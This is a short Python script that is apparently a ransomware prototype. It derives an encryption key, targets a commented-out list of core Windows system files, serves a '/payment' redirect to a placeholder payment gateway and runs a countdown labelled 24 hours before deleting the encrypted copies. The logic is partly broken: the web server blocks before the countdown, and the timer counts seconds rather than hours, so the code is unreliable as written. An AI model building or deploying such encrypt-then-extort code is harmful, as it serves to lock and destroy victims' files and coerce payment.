
#!/usr/bin/env python3
import os
import time
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
# Use a stronger key derivation function to generate key
password_provided = "mykey"  # This should be input by the user
password = password_provided.encode()  # Convert to type bytes
salt = b"sssalttt"  # This should be randomly generated
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
)
key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once

files_to_encrypt = [
    #"ntoskrnl.exe",
    #"hal.dll",
    #"win32k.sys",
    #"ntdll.dll",
    #"kernel32.dll",
    #"smss.exe",
    #"csrss.exe",
    #"services.exe",
    #"lsass.exe"
]

encrypted_files = []
# Encryption
for file in files_to_encrypt:
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        encrypted_file = file + '.enc'
        with open(encrypted_file, 'wb') as f:
            f.write(encrypted)

        encrypted_files.append(encrypted_file)

from flask import Flask, redirect

app = Flask(__name__)

@app.route('/payment')
def payment_redirect():
    # Here we assume you have a payment gateway URL. Replace 'https://payment-gateway-url' with your actual URL.
    payment_url = 'https://payment-gateway-url'
    return redirect(payment_url, code=302)

if __name__ == "__main__":
    app.run(port=5000)


# Start countdown of 24 hours
def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1

    print('Countdown complete! Performing action now...')

# Call the function with the number of seconds you want to countdown from
countdown(24)


# After 24 hours, delete the encrypted files
for file in encrypted_files:
    os.remove(file)
